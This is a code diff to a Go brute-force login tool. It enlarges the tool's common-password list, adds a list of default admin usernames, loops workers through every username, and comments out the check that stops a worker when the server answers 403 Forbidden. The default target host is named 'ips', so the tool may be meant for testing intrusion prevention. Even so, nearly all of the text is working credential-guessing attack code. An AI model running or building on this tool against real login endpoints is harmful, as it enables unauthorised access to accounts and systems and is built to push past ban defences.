@@ -42,18 +42,30 @@ var commonPasswords = []string{
 	"superadmin", "pass123", "password!", "password@", "adminadmin",
 	"security", "network", "computer", "server", "database", "webadmin",
 	"adminpass", "securepass", "mysecret", "111111", "000000", "p@ssw0rd",
+	"letmein", "iloveyou", "trustno1", "1234567", "1234567890", "qwertyuiop",
+	"asdfghjkl", "zxcvbnm", "qazwsx", "1q2w3e4r", "1qaz2wsx", "qwerty123",
+	"password1", "password2", "password3", "password4", "password5", "password6",
+	"password7", "password8", "password9", "password10", "letmein123", "welcome123",
+	"admin1234", "admin12345", "admin123456", "admin1234567", "admin12345678",
+	"admin123456789", "admin1234567890", "admin!@#", "admin@123", "admin!123", "admin#123",
 }
+var commonAdminUsers = []string{
+	"admin", "administrator", "root", "toor", "user", "test", "guest",
+	"admin123", "admin@123", "admin1234", "admin!@#", "admin_pass",
+	"admin_user", "webadmin", "sysadmin", "superuser", "admin1", "admin2",
+	"admin3", "admin4", "admin5", "admin6", "admin7", "admin8", "admin9",
+	"admin10", "admin11", "admin12", "admin13", "admin14", "admin15"}
 
 // worker for Brute Force Attacker
-func worker(wg *sync.WaitGroup, client *http.Client, baseURL string, loginPath string, adminUser string, adminRoute string, id int) {
+func worker(wg *sync.WaitGroup, client *http.Client, baseURL string, loginPath string, adminRoute string, id int) {
 	defer wg.Done()
 
 	loginURL := baseURL + loginPath
 	adminURL := baseURL + adminRoute
 
-	fmt.Printf("[worker %d] Starting brute-force attack on %s for user '%s'...\n", id, loginURL, adminUser)
+	for _, adminUser := range commonAdminUsers { // Loop indefinitely to keep trying passwords
+		fmt.Printf("[worker %d] Starting brute-force attack on %s for user '%s'...\n", id, loginURL, adminUser)
 
-	for { // Loop indefinitely to keep trying passwords
 		for _, password := range commonPasswords {
 			fmt.Printf("[worker %d] Trying password: %s for user '%s'\n", id, password, adminUser)
 
@@ -99,6 +111,10 @@ func worker(wg *sync.WaitGroup, client *http.Client, baseURL string, loginPath s
 				time.Sleep(1 * time.Second)
 				continue
 			}
+			// if resp.StatusCode == 403 {
+			// 	fmt.Printf("[worker %d] was banned 403 Forbidden, stopping\n", id)
+			// 	return
+			// }
 
 			if resp.StatusCode == http.StatusOK {
 				fmt.Printf("[worker %d] SUCCESS! Found password '%s' for user '%s'. Status: %d\n", id, password, adminUser, resp.StatusCode)
@@ -142,7 +158,6 @@ func worker(wg *sync.WaitGroup, client *http.Client, baseURL string, loginPath s
 func main() {
 	baseURL := getEnv("target_host", "http://ips:8080")
 	loginRoute := getEnv("target_login_route", "/login") // Default login route
-	adminUser := getEnv("target_admin_user", "admin")    // Default admin username
 	adminRoute := getEnv("target_admin_route", "/admin") // Default admin route after successful login
 	concurrency := getEnv("concurrency", "5")            // Moderate concurrency for brute force
 
@@ -158,7 +173,7 @@ func main() {
 	var wg sync.WaitGroup
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
-		go worker(&wg, client, baseURL, loginRoute, adminUser, adminRoute, i)
+		go worker(&wg, client, baseURL, loginRoute, adminRoute, i)
 	}
 
 	wg.Wait()
